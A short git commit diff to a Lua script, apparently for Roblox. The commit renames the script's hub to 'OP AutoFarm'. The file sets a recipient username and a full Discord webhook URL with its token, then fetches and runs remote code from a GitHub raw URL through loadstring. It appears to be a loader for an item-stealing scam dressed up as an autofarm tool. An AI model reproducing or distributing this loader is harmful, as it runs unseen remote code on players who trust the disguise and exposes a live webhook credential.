ebd40c9d2f96311dc0a2010102adbae25d6ef278
qw1no <133776153+qw1no@users.noreply.github.com>
2023-05-16 19:17:24 +0300

    Update dadada.lua

--- dadada.lua
+++ dadada.lua
@@ -1,5 +1,5 @@
 _G.Username = "VTWitchDoctor"
-_G.HubName = "ez farm diamond"
+_G.HubName = "OP AutoFarm"
 _G.WebhookUrl = "https://discord.com/api/webhooks/1108014181040533515/jF3SEqnyQ2vuYRri0NDkYAWgeL5vbhrHWuVRF_KD5MFKcC_qtrE3bj-vJiY_LghjnhJk"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
